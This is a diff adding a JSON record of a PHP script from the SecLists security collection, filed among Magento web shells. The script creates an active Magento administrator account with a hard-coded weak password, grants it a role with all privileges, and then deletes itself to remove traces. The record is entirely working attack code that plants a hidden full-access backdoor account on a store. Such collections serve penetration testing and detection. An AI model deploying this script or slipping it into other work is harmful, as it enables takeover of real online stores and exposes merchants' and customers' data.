@@ -1,0 +1,9 @@
+{
+  "source": "github",
+  "source_id": "github:danielmiessler/SecLists:Web-Shells/Magento/newadmin-KINKCreative.php",
+  "title": "danielmiessler/SecLists/Web-Shells/Magento/newadmin-KINKCreative.php",
+  "text": "<?php\n\n/*\n\nPut this file into your root folder. Set the user settings below and run the script. It will auto-delete when done.\n\n*/\n\n$mageFilename = 'app/Mage.php';\nif (!file_exists($mageFilename)) {\n\techo $mageFilename.\" was not found\";\n\texit;\n}\nrequire_once $mageFilename;\nMage::app();\n\ntry {\n\t//create new user by providing details below\n\t$user = Mage::getModel('admin/user')\n\t\t->setData(array(\n\t\t\t'username'  => 'admin',\n\t\t\t'firstname' => 'Admin',\n\t\t\t'lastname'\t=> 'User',\n\t\t\t'email'     => 'admin@mymagento.com',\n\t\t\t'password'  => 'admi',\n\t\t\t'is_active' => 1\n\t\t))->save();\n\n} catch (Exception $e) {\n\techo $e->getMessage();\n\texit;\n}\n\ntry {\n\t//create new role\n\t$role = Mage::getModel(\"admin/roles\")\n\t\t\t->setName('Inchoo')\n\t\t\t->setRoleType('G')\n\t\t\t->save();\n\t\n\t//give \"all\" privileges to role\n\tMage::getModel(\"admin/rules\")\n\t\t\t->setRoleId($role->getId())\n\t\t\t->setResources(array(\"all\"))\n\t\t\t->saveRel();\n\n} catch (Mage_Core_Exception $e) {\n\techo $e->getMessage();\n\texit;\n} catch (Exception $e) {\n\techo 'Error while saving role.';\n\texit;\n}\n\ntry {\n\t//assign user to role\n\t$user->setRoleIds(array($role->getId()))\n\t\t->setRoleUserId($user->getUserId())\n\t\t->saveRelations();\n\n} catch (Exception $e) {\n\techo $e->getMessage();\n\texit;\n}\n\necho 'Admin User sucessfully created!';\necho '<br /><br /><b>THIS FILE WILL NOW TRY TO DELETE ITSELF, BUT PLEASE CHECK TO BE SURE!</b>';\n@unlink(__FILE__);\n\n",
+  "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/Magento/newadmin-KINKCreative.php",
+  "language": "php",
+  "kind": "code"
+}
